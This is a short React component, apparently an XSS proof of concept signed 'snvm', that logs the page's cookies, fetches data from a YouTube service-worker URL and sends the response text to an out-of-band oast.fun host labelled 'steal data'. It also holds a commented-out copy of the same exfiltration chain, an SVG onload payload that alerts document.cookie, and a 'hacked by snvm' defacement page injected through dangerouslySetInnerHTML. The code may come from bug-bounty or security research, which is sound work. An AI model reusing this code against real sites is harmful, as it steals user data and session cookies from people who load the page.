import React, { useEffect } from "react";

function TesXss() {
  useEffect(() => {
    // Set the title
    document.title = "XSS by SNVM";

    console.log("doc.cookie", document.cookie);
    const fetchData = async () => {
      try {
        // Fetch the first URL
        const response1 = await fetch("https://www.youtube.com/sw.js_data");
        if (!response1.ok) {
          throw new Error(`HTTP error! Status: ${response1.status}`);
        }

        // Get the text from the response
        const textData = await response1.text();
        console.log(textData, "steal data");

        // Fetch the second URL with the text data
        const response2 = await fetch(
          `https://miyzbheyvzssakiftkyutbn62k0otjc7d.oast.fun?x=${textData}`
        );
        if (!response2.ok) {
          throw new Error(`HTTP error! Status: ${response2.status}`);
        }

        // You can do something with the response from the second URL if needed
        const responseData = await response2.json();
        console.log(responseData);
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };

    fetchData(); // Invoke the fetchData function
    // }, []); // The empty dependency array ensures the effect runs only once (on mount)
    // fetch("https://www.youtube.com/sw.js_data")
    //   .then((a) => a.text())
    //   .then((a) =>
    //     fetch("https://miyzbheyvzssakiftkyutbn62k0otjc7d.oast.fun?x=" + a)
    //   );

    // Set the favicon    // <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
    const favicon = document.querySelector('link[rel="icon"]');
    if (favicon) {
      favicon.href =
        "https://encrypted-tbn2.gstatic.com/faviconV2?url=https://github.com&client=IMAGE_SEARCH&size=32&type=FAVICON&fallback_opts=TYPE,SIZE,URL&nfrp=2";
    }
  }, []);
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en" class="">
    <head>
      <meta charset="utf-8" />
      <head>
		<body>
    <h1>hacked by snvm</h1>

    </body>
    </html>
  `;

  // Use the dangerouslySetInnerHTML prop to render the HTML content
  return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}

export default TesXss;
